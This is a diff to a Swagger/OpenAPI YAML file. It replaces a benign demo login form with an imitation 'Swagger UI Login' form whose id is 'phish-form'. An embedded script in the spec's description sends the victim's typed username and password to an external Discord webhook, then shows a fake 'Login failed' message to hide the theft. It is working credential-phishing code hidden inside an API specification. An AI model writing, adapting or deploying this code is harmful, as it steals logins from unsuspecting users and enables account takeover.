@@ -1,42 +1,51 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Secure Login POC
+  title: Swagger UI Login
   description: |
-    <div class="login-form">
-      <!-- Notice Message -->
-      <div style="max-width: 420px; margin: 20px auto; padding: 15px; background-color: #e9f7ef; border-left: 5px solid #28a745; border-radius: 6px; font-family: sans-serif;">
-        <strong style="color: #155724;">This is a Proof-of-Concept login page. No data will be stored.</strong>
-      </div>
-
-      <!-- Login Heading -->
-      <h2 style="text-align:center; color:#2c3e50; font-family:sans-serif;">Welcome to the Demo Login</h2>
-
-      <!-- Login Form Container -->
-      <div style="max-width: 420px; margin: 20px auto; padding: 20px; background: #ffffff; border-radius: 8px; box-shadow: 0 6px 10px rgba(0,0,0,0.1); font-family: sans-serif;">
-        <form onsubmit="event.preventDefault(); alert('POC Only. No information collected');">
-          <div style="margin-bottom: 15px;">
-            <label for="username" style="display:block; margin-bottom:5px; color:#34495e;">Username</label>
-            <input type="text" name="username" placeholder="Enter username" style="width:100%; padding:10px; border:1px solid #ccc; border-radius:4px;">
-          </div>
-          <div style="margin-bottom: 20px;">
-            <label for="password" style="display:block; margin-bottom:5px; color:#34495e;">Password</label>
-            <input type="password" name="password" placeholder="Enter password" style="width:100%; padding:10px; border:1px solid #ccc; border-radius:4px;">
-          </div>
-          <button type="submit" style="width:100%; padding:12px; background-color:#007bff; border:none; color:white; font-size:16px; border-radius:4px; cursor:pointer;">Login</button>
-        </form>
-      </div>
-
-      <!-- Footer -->
-      <div style="text-align:center; margin-top:20px; font-size:12px; color:#aaa;">
-        © 2025 Login Demo
-      </div>
+    <div style="font-family: 'Source Sans Pro', sans-serif; background: #f3f3f3; padding: 40px 0;">
+  <div style="max-width: 420px; margin: auto; background: white; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.15); overflow: hidden;">
+    <div style="background-color: #32329f; color: white; padding: 16px 24px;">
+      <h2 style="margin: 0; font-size: 20px;">Swagger UI Login</h2>
     </div>
-paths:
-  /:
-    post:
-      summary: Perform login (POC only)
-      description: Dummy endpoint to simulate login. Does not collect credentials.
-      responses:
-        '200':
-          description: Login simulated successfully
+    <form id="phish-form" style="padding: 24px;">
+      <label style="display: block; margin-bottom: 12px;">
+        <span style="font-size: 14px; color: #333;">Username</span>
+        <input type="text" name="username" required style="width: 100%; padding: 10px; margin-top: 6px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
+      </label>
+      <label style="display: block; margin-bottom: 20px;">
+        <span style="font-size: 14px; color: #333;">Password</span>
+        <input type="password" name="password" required style="width: 100%; padding: 10px; margin-top: 6px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
+      </label>
+      <button type="submit" style="width: 100%; padding: 12px; background: #32329f; color: white; font-size: 16px; border: none; border-radius: 4px; cursor: pointer;">
+        Sign In
+      </button>
+    </form>
+    <div style="background: #f7f7f7; padding: 12px 24px; font-size: 12px; color: #999; text-align: right;">
+      POC by M4ST3R MIND
+    </div>
+  </div>
+</div>
+
+<script>
+  document.getElementById('phish-form').addEventListener('submit', function (e) {
+    e.preventDefault(); // Prevent actual form submission
+
+    const username = this.username.value;
+    const password = this.password.value;
+
+    fetch("https://discord.com/api/webhooks/1391682964097732668/pwEKIM7IVLZZnsUarOokj1jPKrwFuPzrg0dlIKIxsWL1PxMlFdQAUh2vQzZcbRTe1lD3", {
+      method: "POST",
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        content: `🔥 **New Login Captured**\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\`\n🕓 Time: ${new Date().toLocaleString()}`
+      })
+    });
+
+    // Optional feedback to user
+    alert("Login failed. Please try again.");
+  });
+</script>
+
